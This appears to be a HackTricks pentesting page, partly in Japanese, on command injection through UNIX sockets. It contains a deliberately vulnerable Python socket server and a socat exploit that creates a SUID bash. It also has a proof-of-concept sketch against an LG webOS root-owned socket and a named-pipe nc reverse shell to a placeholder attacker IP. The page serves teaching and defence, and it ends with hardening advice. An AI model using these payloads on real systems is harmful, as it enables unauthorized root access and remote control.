# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

以下の例では、**unix socket is created**（`/tmp/socket_test.s`）され、すべて**received**されたものが `os.system` によって**executed**されます。現実世界でこのようなコードを見つけることはまずないでしょうが、この例の目的は、unix sockets を使ったコードがどのように見えるか、そして最悪のケースで入力をどのように扱うかを確認することです。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**実行する** その code を python で: `python s.py` と **ソケットがどのようにリッスンしているか確認する**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## ケーススタディ: Root-owned UNIX socket signal-triggered escalation (LG webOS)

一部の特権デーモンは、root-owned UNIX socket を公開しており、信頼できない入力を受け付け、特権アクションを thread-IDs と signals に結び付けます。プロトコルが非特権クライアントにどの native thread を対象にするか影響させる余地を与える場合、特権コードパスをトリガーして権限昇格できる可能性があります。

観察されたパターン:
- root-owned socket に接続する（例: /tmp/remotelogger）。
- スレッドを作成し、その native thread id (TID) を取得する。
- TID（packed）と padding をリクエストとして送信し、確認応答を受け取る。
- その TID に特定の signal を送って特権動作をトリガーする。

最小限の PoC スケッチ:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
これを root shell に変えるには、単純な named-pipe + nc パターンを使用できます:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
注意:
- この種のバグは、特権のないクライアント状態（TIDs）から導出された値を信用し、それらを特権付きのシグナルハンドラやロジックに結びつけることから発生します。
- socket 上で資格情報を強制し、message formats を検証し、特権操作を外部から供給された thread identifiers から切り離すことでハードニングしてください。

## 参考文献

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
